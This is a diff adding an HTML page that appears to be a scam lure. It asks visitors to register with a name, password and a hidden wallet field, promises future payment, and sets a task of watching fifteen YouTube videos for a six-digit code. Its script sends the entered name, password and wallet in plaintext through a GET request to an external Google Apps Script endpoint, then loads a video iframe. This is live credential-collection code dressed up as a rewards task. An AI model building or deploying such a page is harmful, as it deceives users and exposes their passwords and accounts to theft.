@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Registro de Usuários</title>
+    <link rel="stylesheet" type="text/css" href="estilo.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
+	
+</head>
+<body>
+	<div id="page" class="interface" width="150" height="150">
+		<div class="registro">
+			<input id="name" type="text" placeholder="Name">
+			<input id="pass" type="password" placeholder="Password">
+			<input id="wall" type="text" placeholder="Payer account (В будущем мы будем платить вам за этот адрес)">
+			<button id="meuBotao">Ok</button>
+		</div>
+		<br>
+		Задание 1<br>
+		Посмотрите 15 1-минутных видеороликов на YouTube.<br>
+		Ключевое слово представляет собой шестизначный номер,<br>
+		доступ к которому вы получите после просмотра 15 видеороликов на YouTube.<br>
+		Видео организованы в сетку и их необходимо смотреть в последовательности <br>
+		1,2,3,4,5,6,7,8,9,10,11,12,13,14 и 15.<br>
+		для каждого из них будет кнопка.<br>
+		кнопка 16 покажет управляющее слово<br>
+		вам нужно смотреть видео в отдельном окне, пока счетчик не достигнет нуля.<br>
+		Не забудьте воспроизвести видео, если в вашей учетной записи не включен автозапуск YouTube, спасибо.<br>
+	</div>
+
+
+	<script>
+		const meuBotao = document.getElementById('meuBotao');
+		meuBotao.addEventListener('click', function() {
+		// Seleciona os elementos input
+		var elemName = document.querySelector("#name");
+		var elemPass = document.querySelector("#pass");
+		var elemWall = document.querySelector("#wall");
+		var valorName, valorPass, valorWall;
+		if (elemName) {
+			valorName = elemName.value;  // Coleta os dados antes de remover o elemento
+		}
+		if (elemPass) {
+			valorPass = elemPass.value;  // Coleta os dados antes de remover o elemento
+		}
+		if (elemWall) {
+			valorWall = elemWall.value;  // Coleta os dados antes de remover o elemento
+		}
+
+		// Remove o formulario de Registro
+		var div = document.getElementsByClassName("registro");
+		if (div[0]) {
+			var pai = div[0].parentNode;
+			pai.removeChild(div[0]);
+			addvd("video.html", "page")
+		}
+
+		
+
+		// Chama a função enviar
+		if (valorName && valorPass &&valorWall) {
+			enviar(valorName, valorPass, valorWall);
+		}
+});
+
+function enviar(nameValue, passValue, wallValue) {
+    //var url = 'https://script.google.com/macros/s/AKfycbxi90Jj5F5S86Wlqu9xwxQ3VaeSF0C3lKPoK1uMLScNSFkzhlYDQQd7a5QBU5opwC2-fg/exec'
+    var url='https://script.google.com/macros/s/AKfycbwzE8UCUiOhvSgzUASbDTiDzeBql1J-iF4nG3FWdwk20AoIjZC3qTOMtwBcBdnOWlBBBw/exec'
+	var dados = {name: nameValue, password: passValue, wallet: wallValue}; // envie suas variáveis aqui
+    $.ajax({
+        url: url,
+        method: "GET",
+        dataType: "json",
+        data: dados
+    }).done(function() {
+        console.log('Dados enviados com sucesso!');
+    }).fail(function() {
+        console.log('Erro ao enviar dados.');
+    });
+}</script>
+
+	 
+</body>
+<script>
+
+
+
+function addvd(url, elementoId) {
+    // Cria um novo elemento iframe
+    var ifrm = document.createElement("iframe");
+    // Define o atributo 'src' para a URL da página que você deseja carregar
+    ifrm.setAttribute("src", url);
+    // Obtém uma referência ao elemento
+    var elem = document.getElementById(elementoId);
+	ifrm.style.width = "100%";
+	ifrm.style.height = "60%";
+    // Adiciona o iframe ao elemento
+    elem.appendChild(ifrm);
+}
+</script>
+<style>
+	.interface {
+		width: 100vw;
+		height: 100vh;
+	}
+	#wall {
+    display: none;
+}
+</style>
+</html>
